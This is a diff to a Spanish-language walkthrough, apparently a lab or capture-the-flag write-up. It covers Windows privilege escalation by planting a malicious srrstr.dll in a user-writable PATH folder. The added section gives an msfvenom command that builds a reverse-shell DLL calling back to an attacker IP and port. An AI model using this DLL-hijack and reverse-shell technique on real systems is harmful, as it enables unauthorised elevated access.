@@ -498,7 +498,16 @@ cmd /c echo %PATH%
 <img width="998" height="109" alt="image" src="https://github.com/user-attachments/assets/3eae6af4-5ec3-4622-9a20-3b9335d9e89b" />
 
 Encontramos en el path la ruta `C:\Users\sarah\AppData\Local\Microsoft\WindowsApps` 
-Nuestro usuario tiene permiso de escritura sobre esa ruta. Esto quiere decir que podriamos colocar una dll maliciosa con el nombre `srrstr.dll` en esa ruta y lograr que el binario la ejecute en un contexto elevado
+
+Nuestro usuario tiene permiso de escritura sobre esa ruta. Esto quiere decir que podriamos colocar una dll maliciosa con el nombre `srrstr.dll` en esa ruta y lograr que el binario la ejecute en un contexto elevado.
+
+El siguiente paso es generar la `dll` maliciosa en nuestra máquina con `msfvenom`
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.7 LPORT=7777 -f dll > srrstr.dll
+```
+<img width="818" height="192" alt="image" src="https://github.com/user-attachments/assets/2f773ec5-58f9-4e1c-a442-1719107f38a2" />
+
+
 
 
 
